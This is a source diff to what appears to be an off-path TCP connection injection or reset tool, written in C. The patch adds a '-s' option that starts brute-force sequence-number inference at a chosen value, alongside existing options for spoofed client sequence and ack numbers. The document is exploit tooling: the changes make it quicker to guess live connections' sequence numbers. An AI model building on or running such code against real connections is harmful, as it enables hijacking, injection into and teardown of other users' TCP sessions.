@@ -100,6 +100,7 @@ typedef struct thctx_struct {
 	// inject or reset?
 	u_long packets_per_second;
 	u_long packet_delay;
+	u_long start_seq;
 } thctx_t;
 
 /* for probing groups of values, limited by PACKETS_PER_SECOND */
@@ -152,6 +153,7 @@ void usage(char *argv0)
 			// if it differs from legit connection port
 			"-P <port>      alternate server port (advanced)\n"
 			"-r <rate>      max packets per second\n"
+			"-s <sequence>  skip to this number when starting sequence inference\n"
 			"-S <sequence>  spoofed client sequence number\n"
 			// time offset? (to avoid sync_time_with_remote)
 			"-A <sequence>  spoofed client ack number\n");
@@ -193,7 +195,7 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	while ((c = getopt(argc, argv, "ad:hp:P:r:S:A:")) != -1) {
+	while ((c = getopt(argc, argv, "ad:hP:p:r:S:s:A:")) != -1) {
 		switch (c) {
 			case '?':
 			case 'h':
@@ -256,6 +258,19 @@ int main(int argc, char *argv[])
 						return 1;
 					}
 					g_ctx.spoof.seq = tmp;
+				}
+				break;
+
+			case 's':
+				{
+					char *pend = NULL;
+					u_long tmp = strtoul(optarg, &pend, 0);
+
+					if (!pend || *pend) {
+						fprintf(stderr, "invalid spoof sequence number: %s\n", optarg);
+						return 1;
+					}
+					g_ctx.start_seq = tmp;
 				}
 				break;
 
@@ -989,7 +1004,10 @@ int infer_sequence_number(void)
 			 */
 			step = 0;
 
-			sched = build_schedule(0, UINT32_MAX / g_ctx.winsz, &nchunks);
+			if (g_ctx.start_seq)
+				sched = build_schedule(g_ctx.start_seq / g_ctx.winsz, UINT32_MAX / g_ctx.winsz, &nchunks);
+			else
+				sched = build_schedule(0, UINT32_MAX / g_ctx.winsz, &nchunks);
 			if (!sched)
 				return 0;
 			/* further stages will launch as things progress */
